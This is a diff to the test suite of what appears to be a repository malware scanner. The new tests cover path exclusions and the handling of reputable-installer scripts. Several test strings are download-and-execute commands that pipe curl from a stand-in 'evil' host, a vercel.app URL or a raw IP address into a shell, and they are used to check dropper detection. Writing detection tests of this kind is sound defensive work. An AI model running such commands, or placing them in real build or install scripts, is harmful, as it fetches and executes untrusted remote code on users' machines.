@@ -19,6 +19,24 @@ def test_detects_obfuscation_and_download_exec():
     assert "download_exec" in cats
 
 
+def test_ignores_thirdparty_and_test_trees_in_large_oss():
+    # 2026-07-07 CTF FPs: cheribsd `contrib/netbsd-tests/.../t_cmdsub.sh` (nc-exec)
+    # and freebsd-ports `devel/electron*/files/packagejsons/package.json`
+    # (npm-preinstall) confirmed on THIRD-PARTY / vendored / regression-test code.
+    from pathlib import Path
+
+    from git_warden.scanning.bash_scanner import is_ignored_path
+    for p in ("contrib/netbsd-tests/bin/sh/t_cmdsub.sh",
+              "devel/electron40/files/packagejsons/package.json",
+              "sys/regress/net/foo.sh",
+              "lib/libc-tests/gen/foo.c"):
+        assert is_ignored_path(Path(p)), p
+    # genuine first-party payload paths are STILL scanned (no over-exclusion)
+    assert not is_ignored_path(Path("src/index.js"))
+    assert not is_ignored_path(Path(".vscode/tasks.json"))
+    assert not is_ignored_path(Path("vite.config.ts"))
+
+
 def test_benign_dockerfile_idioms_are_not_flagged():
     # 2026-07-06 docker FP audit: standard Docker build lines were confirming as
     # download_exec / exfiltration. `curl -f ... | bash` from a reputable installer
@@ -118,3 +136,16 @@ def test_dockerfile_and_shebang_are_bash_bearing(tmp_path):
 def test_plain_yaml_outside_workflow_is_skipped(tmp_path):
     (tmp_path / "config.yml").write_text("run: curl http://evil | bash\n", encoding="utf-8")
     assert scan_repo(tmp_path) == []  # .yml only scanned under a workflow path
+
+
+def test_reputable_installer_preinstall_is_not_flagged():
+    # 2026-07-07: meteor-vue-admin / zk-vrf confirmed on preinstall scripts that
+    # bootstrap a legit toolchain (Meteor, Rust). A lifecycle script fetching only
+    # reputable installers is not a dropper.
+    from git_warden.scanning.manifest_scanner import _only_reputable_install
+    assert _only_reputable_install('curl https://install.meteor.com/ | sh')
+    assert _only_reputable_install("curl --proto '=https' -sSf https://sh.rustup.rs | sh")
+    assert _only_reputable_install("curl -fsSL https://deb.nodesource.com/setup_20.x | bash")
+    # an attacker/non-installer host is still a dropper
+    assert not _only_reputable_install("curl https://default-configuration.vercel.app/x | sh")
+    assert not _only_reputable_install("curl http://185.12.34.56/a.sh | sh")
